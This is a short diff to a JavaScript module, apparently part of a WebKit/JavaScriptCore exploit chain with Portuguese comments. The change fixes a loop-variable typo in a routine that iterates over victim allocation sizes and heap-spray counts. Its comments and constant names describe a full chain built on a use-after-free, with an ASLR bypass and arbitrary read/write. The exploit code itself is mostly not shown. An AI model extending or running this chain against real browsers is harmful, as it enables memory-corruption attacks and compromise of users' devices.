@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v156 - Correção do ReferenceError e Offset de VTable)
+// js/script3/testArrayBufferVictimCrash.mjs (v157 - Correção do erro de digitação da variável de loop)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v156_FIX_REF_ERROR";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v157_FIX_TYPO";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -393,7 +393,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     const VICTIM_SIZES_TO_TEST = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140]; // Exemplo: múltiplos tamanhos de vítima
     const SPRAY_COUNTS_TO_TEST = [5000, 10000, 15000, 20000]; // Múltiplos volumes de spray
 
-    for (const victim_size of VICTORY_SIZES_TO_TEST) {
+    // CORREÇÃO: Use VICTIM_SIZES_TO_TEST no loop for
+    for (const victim_size of VICTIM_SIZES_TO_TEST) {
         for (const spray_count of SPRAY_COUNTS_TO_TEST) {
             logFn(`\n--- INICIANDO NOVA TENTATIVA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count} ---`, "tool");
             const attemptResult = {
